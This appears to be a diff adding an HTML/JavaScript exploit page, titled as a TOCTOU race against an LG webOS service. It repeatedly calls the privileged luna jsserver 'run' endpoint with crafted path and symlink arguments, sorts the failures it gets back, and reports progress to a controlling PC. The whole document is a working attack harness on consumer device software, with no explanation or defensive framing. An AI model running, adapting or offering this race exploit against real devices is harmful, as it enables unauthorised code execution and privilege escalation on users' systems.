@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>SlopBro LGPSVE-2445 race</title>
+<style>
+body{background:#050708;color:#e8eef2;font:20px monospace;padding:18px}
+.ok{color:#7dff9b}.err{color:#ff7474}.lbl{color:#69ddff}#out{white-space:pre-wrap}
+</style>
+</head>
+<body>
+<h1>SlopBro — LGPSVE-2445 TOCTOU</h1>
+<div id="out"></div>
+<script>
+(function(){
+'use strict';
+var out=document.getElementById('out'),RUN='luna://com.webos.service.jsserver/run';
+function qp(n){var q=location.search.substring(1).split('&');for(var i=0;i<q.length;i++){var p=q[i].split('=');if(p[0]===n)return decodeURIComponent(p[1]||'');}return null;}
+var base=qp('base'),trusted=qp('trusted'),N=parseInt(qp('attempts'),10)||1000;
+var counts={ok:0,chdir:0,launch:0,setappid:0,enoent:0,module:0,other:0,timeout:0};
+var i=0,finished=false,examples={};
+function line(c,t){var d=document.createElement('div');d.className=c;d.textContent=t;out.appendChild(d);while(out.children.length>45)out.removeChild(out.firstChild);window.scrollTo(0,document.body.scrollHeight);}
+function summary(){var a=[];for(var k in counts)if(counts.hasOwnProperty(k))a.push(k+'='+counts[k]);return a.join(' ');}
+function post(final,reason){try{var x=new XMLHttpRequest();x.open('POST','report',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({base:base,final:final,reason:reason||'',attempt:i,counts:counts,examples:examples}));}catch(e){}}
+function finish(reason){if(finished)return;finished=true;line(reason==='exhausted'?'err':'ok','RACE DONE '+reason+' '+summary());document.title=reason+' '+summary();post(true,reason);}
+function bridge(){if(typeof webOSServiceBridge==='function')return new webOSServiceBridge();if(typeof PalmServiceBridge==='function')return new PalmServiceBridge();return null;}
+function category(txt,obj){if(obj&&obj.returnValue===true)return'ok';if(txt.indexOf('Rejected to chdir')!==-1)return'chdir';if(txt.indexOf('Rejected service launch')!==-1)return'launch';if(txt.indexOf('SetAppid')!==-1||txt.indexOf('SetAppId')!==-1)return'setappid';if(txt.indexOf('Cannot find module')!==-1)return'module';if(txt.indexOf('ENOENT')!==-1)return'enoent';return'other';}
+function callRun(path,control,cb){
+ var b=bridge(),done=false;if(!b){finish('no-bridge');return;}
+ var timer=setTimeout(function(){if(!done){done=true;cb('timeout',null,'timeout');}},10000);
+ b.onservicecallback=function(msg){if(done)return;done=true;clearTimeout(timer);var txt=String(msg),obj=null;try{obj=JSON.parse(txt);}catch(e){}var k=category(txt,obj);if(k!=='ok'&&k!=='chdir'&&k!=='launch'&&!examples[k])examples[k]=txt.slice(0,1200);cb(k,obj,txt);};
+ try{b.call(RUN,JSON.stringify({inputParams:'t -- '+control+' zzz '+path+' x'}));}catch(e){if(!done){done=true;clearTimeout(timer);cb('other',null,String(e));}}
+}
+function precheck(){
+ line('lbl','precheck direct trusted path');
+ callRun(trusted,base+'/precheck-direct',function(k){
+  if(k!=='ok'){counts[k]++;finish('precheck-direct-'+k);return;}
+  line('lbl','precheck non-sticky symlink');
+  callRun(base+'/k3static',base+'/precheck-link',function(k2){
+   if(k2!=='ok'){counts[k2]++;finish('precheck-link-'+k2);return;}
+   line('ok','prechecks passed; starting '+N+' unique-path attempts');post(false,'prechecks-passed');step();
+  });
+ });
+}
+function statusThenStep(){
+ if(i%5!==0){step();return;}
+ try{var x=new XMLHttpRequest();x.open('GET','status?x='+Date.now(),true);x.onreadystatechange=function(){if(x.readyState!==4)return;var stop=false;try{stop=JSON.parse(x.responseText).stop===true;}catch(e){}if(stop)finish('stopped-by-pc');else step();};x.send();}catch(e){step();}
+}
+function step(){
+ if(finished)return;if(i>=N){finish('exhausted');return;}
+ var idx=i;callRun(base+'/k3u'+idx,base+'/k3c'+idx,function(k){
+  counts[k]++;i++;
+  if(i%50===0){line('lbl',i+'/'+N+' '+summary());post(false,'progress');}
+  statusThenStep();
+ });
+}
+line('lbl','base: '+base);precheck();
+})();
+</script>
+</body>
+</html>
